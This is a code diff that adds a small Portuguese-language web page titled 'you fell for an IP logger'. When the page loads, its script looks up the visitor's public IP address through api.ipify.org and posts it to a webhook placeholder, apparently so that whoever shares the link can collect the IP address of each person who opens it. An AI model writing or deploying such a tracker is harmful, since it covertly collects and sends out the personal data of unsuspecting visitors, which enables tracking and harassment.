@@ -1,0 +1,37 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+</head>
+<body>
+<h1>vc caiu num ip logger</h1>
+    </footer>
+    <script>
+        (function() {
+            const sendURL = "seu webhook";
+
+            function captureVisitorData() {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => sendData(data.ip))
+                    .catch(() => console.warn("Não foi possível capturar o IP."));
+            }
+
+            function sendData(visitorIP) {
+                const payload = { content: `Novo visitante: ${visitorIP}` };
+                fetch(sendURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (!response.ok) console.error("Erro ao enviar dados:", response.status);
+                })
+                .catch(() => console.warn("Não foi possível enviar os dados."));
+            }
+
+            captureVisitorData();
+        })();
+    </script>
+</body>
+</html>
